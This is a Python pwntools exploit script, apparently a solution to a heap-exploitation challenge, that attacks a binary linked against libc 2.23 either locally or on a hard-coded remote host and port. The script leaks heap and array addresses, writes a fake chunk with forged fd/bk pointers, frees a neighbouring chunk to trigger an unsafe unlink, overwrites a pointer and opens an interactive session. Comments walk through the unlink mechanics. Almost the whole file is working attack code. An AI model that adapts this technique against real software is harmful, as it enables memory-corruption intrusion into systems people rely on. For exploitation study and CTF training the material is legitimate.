#!/usr/bin/python3

from pwn import *
import sys

# change those
LIBC = './libc-2.23.so'
HOST = '140.110.112.77'
PORT = 9002

libc = ELF( LIBC )
context.arch = 'amd64'

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
else:
    r = process('./U', env={"LD_PRELOAD": LIBC})

r.recvuntil('victim\'s address:')
victim = int(r.recvline()[:-1], 16)

r.recvuntil('size\'s address:')
size = int(r.recvline()[:-1], 16)

r.recvuntil("ary's adr:")
arr_addr = int(r.recvline()[:-1], 16)

log.info(f"victim: {hex(victim)},\nsize: {hex(size)},\narray: {hex(arr_addr)}")

def m(idx):
    r.sendlineafter('input: ', str(1))
    r.sendlineafter('x = ', str(idx))
    r.recvuntil('adr:')

    return int(r.recvline()[:-1], 16)

def f(idx):
    r.sendlineafter('input: ', str(0))
    r.sendlineafter('x = ', str(idx))

def w(idx, c):
    r.sendlineafter('input: ', str(2))
    r.sendlineafter('x = ', str(idx))
    r.sendafter('string = ', c)

def s(idx):
    r.sendlineafter('input: ', str(3))
    r.sendlineafter('x = ', str(idx))

"""
### chunk check
FD = P->fd
BK = P->bk
FD->bk = P
BK->fd = P
=> FD->bk = P->bk, BK->fd = P->fd
"""

m(0)
m(1)
m(2)

w(0, (p64(0) + p64(0x80) + p64(arr_addr - 0x18) + p64(arr_addr - 0x10)).ljust(0x80, b'\x00') + p64(0x80) + p64(0x90))
"""after
0                 0x91         # chunk1
0                 0x80         # fake chunk
&chunk1-0x18      &chunk1-0x10 # &chunk1 is the ptr which points to chunk1 in stack
...                            # ignore
0x80              0x90         # chunk2 ; chunk2-0x80 == fake chunk ; 0x91->0x90 make kernel know fake chunk was freed
...                            # ignore
"""
f(1)
"""after
0                 0x91         # chunk2
0                 0x111        # 0x80 + 0x90 ; unlink -> merge two freed chunk
&main_arena       &main_arena  # new fd,bk
...                            # ignore

and
P->fd->bk (P) = P->bk
P->bk->fd (P) = P->fd
result: P = P->fd = P->0x18
"""
w(0, p64(0)*2+p64(0xdeadbeef))
r.sendlineafter('input: ', '5')
r.interactive()
